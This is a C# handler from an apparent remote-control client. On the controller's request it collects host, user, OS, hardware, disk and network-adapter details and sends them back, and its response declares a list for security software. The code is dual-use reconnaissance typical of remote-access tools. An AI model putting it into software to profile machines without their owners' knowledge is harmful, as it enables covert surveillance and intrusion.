using System;
using System.Collections.Generic;
using System.Management;
using System.Net.NetworkInformation;
using System.Threading;
using System.Windows.Forms;
using RemoteControl.Protocals;
using RemoteControl.Protocals.Request;
using RemoteControl.Protocals.Response;

namespace RemoteControl.Client.Handlers
{
    class RequestGetHostInfoHandler : AbstractRequestHandler
    {
        public override void Handle(SocketSession session, ePacketType reqType, object reqObj)
        {
            RunTaskThread(() =>
            {
                var resp = new ResponseGetHostInfo();
                resp.Disks = new List<HostDiskInfo>();
                resp.NetworkAdapters = new List<HostNetworkAdapterInfo>();
                resp.InstalledSoftware = new List<HostSoftwareInfo>();
                resp.SecuritySoftware = new List<HostSecuritySoftwareInfo>();
                resp.CollectedAt = DateTime.Now.ToString("HH:mm:ss");

                try
                {
                    resp.Basic = CollectBasicInfo();
                    resp.System = CollectSystemInfo();
                    resp.Hardware = CollectHardwareInfo();
                    CollectDiskInfo(resp.Disks);
                    CollectNetworkAdapters(resp.NetworkAdapters);
                    resp.Result = true;
                }
                catch (Exception ex)
                {
                    resp.Result = false;
                    resp.Message = ex.Message;
                }

                session.Send(ePacketType.PACKET_GET_HOST_INFO_RESPONSE, resp);
            });
        }

        private HostBasicInfo CollectBasicInfo()
        {
            var info = new HostBasicInfo();
            info.HostName = System.Net.Dns.GetHostName();
            info.UserName = Environment.UserName;
            info.DomainOrWorkgroup = Environment.UserDomainName;
            info.TimeZone = TimeZone.CurrentTimeZone.StandardName;
            info.Region = System.Globalization.CultureInfo.CurrentCulture.Name;

            try
            {
                using (var os = new ManagementObjectSearcher("SELECT LastBootUpTime FROM Win32_OperatingSystem"))
                {
                    foreach (ManagementObject obj in os.Get())
                    {
                        string lastBoot = obj["LastBootUpTime"].ToString();
                        var bootTime = ManagementDateTimeConverter.ToDateTime(lastBoot);
                        var diff = DateTime.Now - bootTime;
                        info.UpTime = string.Format("{0} 天 {1} 小时 {2} 分",
                            (int)diff.TotalDays, diff.Hours, diff.Minutes);
                    }
                }
            }
            catch { info.UpTime = "未知"; }
            return info;
        }

        private HostSystemInfo CollectSystemInfo()
        {
            var info = new HostSystemInfo();
            try
            {
                using (var os = new ManagementObjectSearcher("SELECT Caption, BuildNumber, OSArchitecture FROM Win32_OperatingSystem"))
                {
                    foreach (ManagementObject obj in os.Get())
                    {
                        info.OSName = obj["Caption"].ToString();
                        info.BuildNumber = obj["BuildNumber"].ToString();
                        info.Architecture = obj["OSArchitecture"].ToString();
                    }
                }
            }
            catch
            {
                info.OSName = Environment.OSVersion.ToString();
                info.Architecture = Environment.Is64BitOperatingSystem ? "64-bit" : "32-bit";
            }
            info.ScreenResolution = Screen.PrimaryScreen.Bounds.Width + " × " + Screen.PrimaryScreen.Bounds.Height;
            return info;
        }

        private HostHardwareInfo CollectHardwareInfo()
        {
            var info = new HostHardwareInfo();
            try
            {
                using (var cpu = new ManagementObjectSearcher("SELECT Name, NumberOfCores, NumberOfLogicalProcessors FROM Win32_Processor"))
                {
                    foreach (ManagementObject obj in cpu.Get())
                    {
                        info.CpuName = obj["Name"].ToString().Trim();
                        info.PhysicalCoreCount = Convert.ToInt32(obj["NumberOfCores"]);
                        info.LogicalCoreCount = Convert.ToInt32(obj["NumberOfLogicalProcessors"]);
                    }
                }
            }
            catch { info.CpuName = "未知"; }

            try
            {
                using (var mem = new ManagementObjectSearcher("SELECT TotalVisibleMemorySize, FreePhysicalMemory FROM Win32_OperatingSystem"))
                {
                    foreach (ManagementObject obj in mem.Get())
                    {
                        info.TotalMemoryMB = Convert.ToInt64(obj["TotalVisibleMemorySize"]) / 1024;
                        info.AvailableMemoryMB = Convert.ToInt64(obj["FreePhysicalMemory"]) / 1024;
                    }
                }
            }
            catch { }
            return info;
        }

        private void CollectDiskInfo(List<HostDiskInfo> disks)
        {
            try
            {
                foreach (var drive in System.IO.DriveInfo.GetDrives())
                {
                    if (!drive.IsReady) continue;
                    disks.Add(new HostDiskInfo
                    {
                        Mount = drive.Name,
                        FileSystem = drive.DriveFormat,
                        TotalGB = drive.TotalSize / (1024 * 1024 * 1024),
                        AvailableGB = drive.AvailableFreeSpace / (1024 * 1024 * 1024),
                        UsagePercent = Math.Round((1 - (double)drive.AvailableFreeSpace / drive.TotalSize) * 100, 1)
                    });
                }
            }
            catch { }
        }

        private void CollectNetworkAdapters(List<HostNetworkAdapterInfo> list)
        {
            try
            {
                foreach (var ni in NetworkInterface.GetAllNetworkInterfaces())
                {
                    if (ni.OperationalStatus != OperationalStatus.Up) continue;
                    var na = new HostNetworkAdapterInfo();
                    na.Name = ni.Name;
                    na.MacAddress = ni.GetPhysicalAddress().ToString();
                    na.Status = ni.OperationalStatus.ToString();
                    na.IPAddresses = new List<string>();
                    var props = ni.GetIPProperties();
                    foreach (var addr in props.UnicastAddresses)
                        na.IPAddresses.Add(addr.Address.ToString());
                    list.Add(na);
                }
            }
            catch { }
        }
    }
}
